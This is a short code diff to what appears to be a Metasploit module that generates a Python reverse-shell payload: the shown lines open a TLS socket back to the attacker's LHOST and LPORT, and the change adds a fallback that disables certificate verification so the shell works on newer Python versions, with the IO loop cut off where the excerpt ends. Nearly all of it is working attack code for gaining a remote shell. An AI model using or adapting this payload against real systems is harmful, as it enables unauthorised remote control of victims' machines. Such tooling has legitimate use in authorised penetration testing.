@@ -55,7 +55,9 @@ module MetasploitModule
     cmd += "import socket,subprocess,os,ssl\n"
     cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
     cmd += "so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
-    cmd += "s=ssl.wrap_socket(so)\n"
+    cmd += "try:s=ssl.wrap_socket(so)\n"
+    cmd += "except AttributeError:ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;s=ctx.wrap_socket(so)\n"
+
     # The actual IO
     cmd += "#{dead}=False\n"
     cmd += "while not #{dead}:\n"
